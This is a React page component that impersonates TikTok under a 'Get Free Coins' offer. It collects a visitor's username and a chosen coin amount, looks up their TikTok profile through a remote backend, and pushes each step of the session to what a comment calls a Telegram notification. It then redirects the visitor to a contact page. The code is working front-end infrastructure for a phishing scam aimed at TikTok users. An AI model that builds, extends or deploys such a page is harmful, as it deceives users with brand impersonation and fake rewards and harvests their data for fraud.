import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "https://proje-1-d4xz.onrender.com";
const API = `${BACKEND_URL}/api`;

const HomePage = () => {
  const navigate = useNavigate();
  const [username, setUsername] = useState('');
  const [selectedCoin, setSelectedCoin] = useState(100000);
  const [sessionId, setSessionId] = useState(null);
  const [isSubmitting, setIsSubmitting] = useState(false); // Yeni state

  useEffect(() => {
    const existingSessionId = localStorage.getItem('sessionId');
    if (existingSessionId) {
      setSessionId(existingSessionId);
    } else {
      const createSession = async () => {
        try {
          const response = await axios.post(`${API}/session/create`);
          const newSessionId = response.data.session_id;
          setSessionId(newSessionId);
          localStorage.setItem('sessionId', newSessionId);
        } catch (error) {
          console.error('Failed to create session:', error);
        }
      };
      createSession();
    }
  }, []);

  const coinOptions = [
    { value: 25000, label: '25,000' },
    { value: 50000, label: '50,000' },
    { value: 100000, label: '100,000' }
  ];

  const handleContinue = async () => {
    if (username.trim() && sessionId) {
      setIsSubmitting(true); // Butonu kilitle

      // 1. LocalStorage Kayıtları
      localStorage.setItem('username', username);
      localStorage.setItem('coinAmount', selectedCoin);

      // 2. TikTok Data Çekme
      try {
        const tiktokResponse = await axios.get(`${API}/tiktok/user/${username}`);
        if (tiktokResponse.data.success) {
          localStorage.setItem('tiktokData', JSON.stringify(tiktokResponse.data));
        }
      } catch (error) {
        console.error('Failed to fetch TikTok data:', error);
      }

      // 3. Telegram'a Bildirim Gönderme (Backend Tetikleme)
      try {
        await axios.post(`${API}/session/step`, {
          session_id: sessionId,
          step: 'username_coin',
          data: {
            username: username,
            amount: selectedCoin
          }
        });
      } catch (error) {
        console.error('Failed to submit step:', error);
      } finally {
        setIsSubmitting(false); // İşlem bitince aç
        navigate('/contact'); // Yönlendirme
      }
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#0a0a0b] via-[#121214] to-[#0a0a0b]">
      {/* Header */}
      <header className="flex items-center justify-between px-6 py-4 bg-[#0f0f10] border-b border-gray-800">
        <div className="flex items-center gap-3">
          <span className="text-white text-2xl font-bold tracking-tight">TikTok</span>
          <div className="flex gap-1.5">
            <div className="w-2 h-2 rounded-full bg-pink-500"></div>
            <div className="w-2 h-2 rounded-full bg-cyan-400"></div>
          </div>
          <div className="ml-2">
            <div className="text-white text-sm font-semibold">Creator</div>
            <div className="text-white text-sm font-semibold">Marketplace</div>
          </div>
        </div>
        <Button className="bg-[#fe2c55] hover:bg-[#ff4266] text-white font-semibold px-8 py-2 rounded-md transition-all">
          Login
        </Button>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-6 py-12">
        <div className="text-center mb-12">
          <h1 className="text-6xl font-black mb-4">
            <span className="bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-400 bg-clip-text text-transparent">
              TikTok
            </span>
          </h1>
          <p className="text-cyan-400 text-2xl font-semibold">Get Free Coins</p>
        </div>

        <p className="text-gray-400 text-center text-lg mb-8">
          Enter your TikTok username and choose a coin amount.
        </p>

        {/* Username Input */}
        <div className="mb-8">
          <label className="text-white text-lg mb-3 block">Username</label>
          <Input
            type="text"
            placeholder="@username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="w-full bg-[#1a1a1c] border border-gray-700 text-white placeholder:text-gray-500 px-4 py-6 text-lg rounded-lg focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400"
          />
        </div>

        {/* Coin Selection */}
        <div className="mb-8">
          <label className="text-white text-lg mb-4 block">Select Coin Amount</label>
          <div className="grid grid-cols-3 gap-4">
            {coinOptions.map((option) => (
              <button
                key={option.value}
                onClick={() => setSelectedCoin(option.value)}
                className={`flex items-center justify-center gap-2 sm:gap-3 p-3 sm:p-6 rounded-xl border-2 transition-all ${
                  selectedCoin === option.value
                    ? 'bg-[#1a1a1c] border-cyan-400 shadow-lg shadow-cyan-400/20'
                    : 'bg-[#1a1a1c] border-gray-700 hover:border-gray-600'
                }`}
              >
                <img src="/coin-icon.png" alt="Coin" className="w-6 h-6 sm:w-7 sm:h-7 object-contain flex-shrink-0" />
                <span className="text-white text-lg sm:text-2xl font-bold">{option.label}</span>
              </button>
            ))}
          </div>
        </div>

        {/* Continue Button */}
        <Button
          onClick={handleContinue}
          disabled={!username.trim() || isSubmitting}
          className="w-full bg-gradient-to-r from-[#1a1a1c] to-[#2a2a2c] hover:from-[#f5224a] hover:to-[#f5224a] text-gray-400 hover:text-white font-semibold py-6 text-lg rounded-lg border border-gray-700 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {isSubmitting ? 'Loading...' : 'Continue'}
        </Button>
      </main>
    </div>
  );
};

export default HomePage;
